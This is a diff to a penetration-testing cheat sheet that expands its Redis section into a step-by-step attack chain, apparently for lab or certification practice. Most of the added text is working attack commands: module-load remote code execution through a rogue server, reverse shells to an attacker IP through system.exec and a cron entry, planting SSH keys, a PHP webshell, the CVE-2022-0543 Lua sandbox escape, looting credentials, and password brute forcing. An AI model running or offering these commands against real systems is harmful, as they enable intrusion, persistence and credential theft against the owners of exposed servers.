@@ -2471,15 +2471,144 @@ nxc postgres $IP -u $U -p $P # test creds
 ```
 **Where it leads:** command execution as the postgres user, file read.
 
-## [ENUM-REDIS]  Port 6379 — Redis (in-memory database)
-**What it is:** a fast key-value store that is **frequently left with no password.** If so, you can often write files to disk → drop a webshell, an SSH key, or a cron job.
-```bash
-redis-cli -h $IP        # connect; then type: info ; config get dir ; keys *
-#   no-auth file write trick: set 'dir' + 'dbfilename' to the web root or ~/.ssh, then save
-#     → writes a webshell or an authorized_keys file
-#   MODULE LOAD → full command execution on some versions [LOOK-UP]
+## [ENUM-REDIS]  Port 6379 — Redis (in-memory key-value store) — FULL CHAIN
+**What it is:** a fast in-memory key-value DB, **very often exposed with NO authentication.** If you can talk to it you can usually read its data AND write files to disk (→ webshell / SSH key / cron), or **load a module → direct RCE** (Redis ≥ 4.0).
+
+### 🗺️ The decision tree (follow top-to-bottom)
 ```
-**Where it leads:** file write → foothold; stored data (session tokens, creds).
+connect →  needs a password?        YES → go to [AUTH] below (find/brute the password first)
+           NO (unauthenticated)  →  run INFO + CONFIG GET *, then pick an attack:
+  ├─ redis_version ≥ 4.0  AND you can CONFIG SET  → A) MODULE-LOAD RCE   ← cleanest, try FIRST
+  ├─ you can write files (CONFIG SET dir works)   → B) SSH key   ·   C) cron   ·   D) webshell (if web root known)
+  ├─ Debian/Ubuntu packaged redis (Lua present)   → E) Lua sandbox escape (CVE-2022-0543)
+  └─ CONFIG locked / nothing writable             → F) LOOT the data (creds/tokens) → reuse elsewhere
+ALWAYS also do F (loot) regardless of which attack you use.
+```
+
+### Step 1 — Connect & first contact
+```bash
+redis-cli -h $IP                      # unauthenticated connect (no -a)
+redis-cli -h $IP PING                 # PONG = reachable
+nmap -p6379 -sCV $IP                  # grabs the version too
+# no redis-cli?  nc $IP 6379   then type:  INFO   (Redis speaks plaintext)
+```
+- Prompt `$IP:6379>` with no password asked = **unauthenticated** ✅ → Step 2.
+- `(error) NOAUTH Authentication required.` → needs a password → **[AUTH]** below.
+
+### Step 2 — Enumerate (these facts pick your attack)
+```
+INFO server                 # redis_version  ← decides module-load (≥4.0) ; also note the OS line
+INFO                        # role (master/slave), persistence, connected_clients
+CONFIG GET dir              # WHERE it writes files (default /var/lib/redis or /tmp)
+CONFIG GET dbfilename       # the save filename (you'll overwrite this)
+CONFIG GET *                # everything — look for: requirepass, protected-mode, dir, bind
+ACL WHOAMI ; ACL LIST       # Redis 6+ : who am I + what am I allowed to do
+MODULE LIST                 # already-loaded modules (a left-behind exploit module = instant RCE)
+KEYS *                      # every key → dump for creds/tokens (Step F)
+```
+**Branch on what you see:**
+- `redis_version` **≥ 4.0** + `CONFIG SET` allowed → **A) module-load RCE** (best).
+- `CONFIG GET dir` returns a path + `CONFIG SET` works → **B / C / D** file-write attacks.
+- `CONFIG SET` → `(error) ... not allowed` / `unknown command 'CONFIG'` → config locked/renamed → **E (Lua)** or **F (loot)**.
+- `KEYS *` shows app data → **F) loot** no matter what.
+
+### A) 🚀 Module-load RCE  (Redis ≥ 4.0) — the cleanest shell
+```bash
+# Kali — rogue server serves a malicious exp.so and makes Redis load it:
+git clone https://github.com/n0b0dyCN/redis-rogue-server ; cd redis-rogue-server
+python3 redis-rogue-server.py --rhost $IP --rport 6379 --lhost <KALI-IP> --lport 4444
+```
+> ⚠️ This tool very commonly dies with `UnicodeDecodeError('gb18030', ...)` **right after `Loading module...`** — the module **usually loaded anyway.** Don't re-run it; drive the loaded module directly:
+```bash
+redis-cli -h $IP
+  MODULE LIST                                              # see the 'system' module → it loaded ✅
+  system.exec "id"                                         # run a command = RCE
+  system.exec "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1'"   # reverse shell (nc -lvnp 4444 first)
+# the module ignores junk bytes before output — the command still works.
+```
+- **Won't load / tool broken?** fixed fork: `git clone https://github.com/Dliv3/redis-rogue-server`
+- **Fully manual:** `CONFIG SET dir /tmp ; CONFIG SET dbfilename exp.so ;` get `exp.so` into `/tmp`, then `MODULE LOAD /tmp/exp.so ; system.exec "id"`.
+- After shell: `id` — redis custom installs sometimes run as **root** (= done). If a low-priv user → `[LINUX-PRIVESC]`.
+
+### B) 🔑 Write an SSH key  (any version — best when there's NO web, e.g. Blackgate)
+```bash
+# Kali — make a key, pad it with blank lines (Redis adds metadata around the value):
+ssh-keygen -t rsa -f ./redis -N ''
+(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > key.txt
+redis-cli -h $IP flushall                                  # optional: clean the keyspace first
+cat key.txt | redis-cli -h $IP -x set sshkey               # load the padded key
+redis-cli -h $IP
+  CONFIG SET dir /home/<user>/.ssh      # try: /var/lib/redis/.ssh , /home/<user>/.ssh , /root/.ssh
+  CONFIG SET dbfilename authorized_keys
+  SAVE
+# log in:
+ssh -i ./redis <user>@$IP
+```
+> **Which user?** get names from a looted key (`KEYS *`), `/etc/passwd` if you can read it, or try the **redis** user (`/var/lib/redis/.ssh`) → then each `/home/*` → then `/root/.ssh` (only if redis runs as root).
+
+### C) ⏰ Write a cron job  (works if redis writes as root, or into a crontab dir)
+```bash
+redis-cli -h $IP
+  CONFIG SET dir /var/spool/cron/crontabs     # Debian/Ubuntu  (RedHat/CentOS: /var/spool/cron)
+  CONFIG SET dbfilename root                   # root's crontab file
+  SET x "\n\n* * * * * bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1\n\n"
+  SAVE
+# nc -lvnp 4444 ; wait up to 60s. (Finicky — the crontab line + newlines must be exact.)
+```
+
+### D) 🌐 Write a webshell  (ONLY if a web server exists AND you know its web root)
+```bash
+redis-cli -h $IP
+  CONFIG SET dir /var/www/html         # the real web root (must exist + be writable)
+  CONFIG SET dbfilename shell.php
+  SET x "<?php system($_GET['c']); ?>"
+  SAVE
+# curl "http://$IP/shell.php?c=id"
+```
+
+### E) 🧪 Lua sandbox escape — CVE-2022-0543  (Debian/Ubuntu packaged Redis)
+A distro packaging bug breaks the Lua sandbox → RCE (try when module-load is blocked).
+```bash
+redis-cli -h $IP eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id","r"); local r = f:read("*a"); f:close(); return r' 0
+```
+`[LOOK-UP]` the exact `liblua` path on the target if that one errors.
+
+### F) 💰 Loot the data  (ALWAYS — even with no RCE)
+```bash
+redis-cli -h $IP
+  KEYS *                       # list every key
+  TYPE <key>                   # then read by type:
+  GET <key>                    #  string
+  HGETALL <key>                #  hash (often user/session records)
+  SMEMBERS <key> ; LRANGE <key> 0 -1
+# dump the WHOLE db and grep it:
+redis-cli -h $IP --scan | head
+redis-cli -h $IP save ; # then read /var/lib/redis/dump.rdb if you get a shell, or:
+strings dump.rdb | grep -iE 'pass|user|token|session|secret'
+```
+App creds/sessions here → **reuse everywhere** (SSH, web, other services) → `[CREDENTIALS-QUICK]`.
+
+### [AUTH] If it demands a password
+```bash
+redis-cli -h $IP -a '<password>'            # once you have one (ignore the "insecure" warning)
+# find the password:
+#  - app config / source / .env  (requirepass is usually reused there)
+#  - CONFIG GET requirepass      (if any partial access)
+#  - brute (last resort):  nmap -p6379 --script redis-brute $IP   |   hydra -P rockyou.txt redis://$IP
+```
+
+### 🧯 Troubleshooting
+| Symptom | Meaning / fix |
+|---|---|
+| `NOAUTH Authentication required` | needs a password → **[AUTH]** |
+| `CONFIG SET ... not allowed` / `unknown command 'CONFIG'` | config locked (protected-mode) or commands **renamed** → use **E (Lua)** or just **F (loot)** |
+| rogue-server `UnicodeDecodeError('gb18030')` | **known tool bug** — module loaded anyway → `redis-cli` → `MODULE LIST` → `system.exec` |
+| `MODULE LOAD` → `unknown command` | version **< 4.0** (no modules) → file-write **B/C/D** instead |
+| SSH key written but login fails | wrong `dir` (not that user's home) · key not newline-padded · `.ssh`/perms → try another user |
+| webshell written, 404 | wrong web root, or no web server on this box → use **B** (SSH key) |
+| `--rhost $IP` "Name or service not known" | `$IP` empty in this tab → use the **literal IP** |
+
+**Leads to:** foothold (RCE / SSH login) → `[LINUX-PRIVESC]`; looted creds → spray `[CREDENTIALS-QUICK]`.
 
 ## [ENUM-MONGODB]  Port 27017 — MongoDB
 ```bash
